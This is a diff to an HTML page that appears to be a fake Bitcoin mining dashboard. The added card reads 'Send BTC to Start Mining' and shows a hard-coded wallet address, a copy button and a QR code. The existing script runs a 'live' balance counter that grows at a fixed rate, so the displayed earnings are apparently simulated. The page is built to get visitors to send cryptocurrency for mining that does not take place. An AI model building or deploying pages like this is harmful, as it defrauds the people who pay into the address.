@@ -43,10 +43,37 @@
     border-bottom:1px solid #222;
   }
   .green { color:#00ff99; }
+  .btc-box {
+    background:#0b0f1a;
+    padding:10px;
+    border-radius:6px;
+    word-break:break-all;
+    margin:10px 0;
+    font-size:14px;
+  }
+  button {
+    padding:6px 12px;
+    margin-bottom:10px;
+    background:#f2a900;
+    border:none;
+    color:black;
+    font-weight:bold;
+    border-radius:6px;
+    cursor:pointer;
+  }
 </style>
 </head>
 
 <body>
+
+<div class="card">
+  <h2>Send BTC to Start Mining</h2>
+  <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
+  <button onclick="copyAddress()">Copy Address</button>
+  <div>
+    <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav" alt="BTC QR Code">
+  </div>
+</div>
 
 <div class="card">
   <h2>Mining Activity</h2>
@@ -65,6 +92,14 @@
 </div>
 
 <script>
+/* COPY BTC ADDRESS */
+function copyAddress(){
+  const btc = document.getElementById('btcAddress').innerText;
+  navigator.clipboard.writeText(btc).then(()=>{
+    alert('BTC address copied to clipboard!');
+  });
+}
+
 /* LIVE BTC COUNTER */
 let balance = 0;
 let rate = 0.00000002; // BTC increment per second
@@ -117,4 +152,4 @@ setInterval(drawChart,500);
 </script>
 
 </body>
-</html>
+                                         </html>
